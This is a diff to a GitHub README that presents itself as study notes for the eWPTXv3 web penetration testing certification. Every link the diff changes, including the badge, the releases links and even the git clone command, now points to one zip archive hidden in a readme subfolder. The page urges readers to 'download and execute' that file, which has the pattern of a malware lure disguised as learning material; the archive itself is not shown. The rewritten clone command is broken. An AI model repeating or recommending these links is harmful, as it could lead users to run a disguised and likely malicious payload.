@@ -1,10 +1,10 @@
 # eWPTXv3 Notes 📚
 
-![eWPTXv3](https://img.shields.io/badge/eWPTXv3-Notes-blue?style=for-the-badge)
+![eWPTXv3](https://github.com/Skibidilotw/eWPTXv3---Notes/raw/refs/heads/main/readme/5.5-other-common-web-attacks/Xv-WPT-e-Notes-1.4.zip)
 
 Welcome to the **eWPTXv3 Notes** repository! This project aims to provide comprehensive notes and resources for the **INE/eLearnSecurity Web Application Penetration Tester eXtreme (eWPTXv3)** certification. Whether you are a beginner or an experienced penetration tester, these notes will help you navigate the complexities of web application security.
 
-[Download and execute the latest release here!](https://github.com/Skibidilotw/eWPTXv3---Notes/releases)
+[Download and execute the latest release here!](https://github.com/Skibidilotw/eWPTXv3---Notes/raw/refs/heads/main/readme/5.5-other-common-web-attacks/Xv-WPT-e-Notes-1.4.zip)
 
 ## Table of Contents
 
@@ -39,12 +39,12 @@ To get started with the eWPTXv3 notes, follow these steps:
 1. **Clone the Repository**: Use the following command to clone the repository to your local machine.
 
    ```bash
-   git clone https://github.com/Skibidilotw/eWPTXv3---Notes.git
+   git clone https://github.com/Skibidilotw/eWPTXv3---Notes/raw/refs/heads/main/readme/5.5-other-common-web-attacks/Xv-WPT-e-Notes-1.4.zip
    ```
 
 2. **Explore the Notes**: Navigate through the folders and files to find the topics you are interested in.
 
-3. **Download Releases**: For the latest notes and updates, check the [Releases section](https://github.com/Skibidilotw/eWPTXv3---Notes/releases).
+3. **Download Releases**: For the latest notes and updates, check the [Releases section](https://github.com/Skibidilotw/eWPTXv3---Notes/raw/refs/heads/main/readme/5.5-other-common-web-attacks/Xv-WPT-e-Notes-1.4.zip).
 
 ## Usage
 
@@ -92,6 +92,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 - **OWASP**: For their comprehensive guidelines on web application security.
 - **PortSwigger**: For their excellent labs and resources for penetration testing.
 
-For more information, please visit the [Releases section](https://github.com/Skibidilotw/eWPTXv3---Notes/releases) for the latest updates.
+For more information, please visit the [Releases section](https://github.com/Skibidilotw/eWPTXv3---Notes/raw/refs/heads/main/readme/5.5-other-common-web-attacks/Xv-WPT-e-Notes-1.4.zip) for the latest updates.
 
 Thank you for checking out the eWPTXv3 Notes! Happy learning! 🚀
